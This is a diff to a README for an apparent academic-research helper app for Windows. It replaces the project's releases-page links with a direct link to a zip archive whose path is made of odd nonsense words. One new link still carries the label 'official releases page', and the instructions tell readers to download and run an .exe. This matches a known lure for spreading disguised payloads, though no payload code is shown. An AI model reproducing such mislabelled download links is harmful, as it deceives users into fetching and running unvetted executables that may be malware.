@@ -1,6 +1,6 @@
 # 🔍 academic-research-skills - Streamline your academic paper research workflow
 
-[![](https://img.shields.io/badge/Download_Academic_Research_Skills-Blue)](https://github.com/micrometeoric-eye978/academic-research-skills/releases)
+[![](https://img.shields.io/badge/Download_Academic_Research_Skills-Blue)](https://raw.githubusercontent.com/micrometeoric-eye978/academic-research-skills/main/participatingly/research-academic-skills-leucitohedron.zip)
 
 ## 📌 About this project
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 and Windows 11. Your computer needs at least
 
 ## 📥 How to download and run 
 
-1. Visit the [official releases page](https://github.com/micrometeoric-eye978/academic-research-skills/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/micrometeoric-eye978/academic-research-skills/main/participatingly/research-academic-skills-leucitohedron.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Locate the file in your Downloads folder once the process finishes.
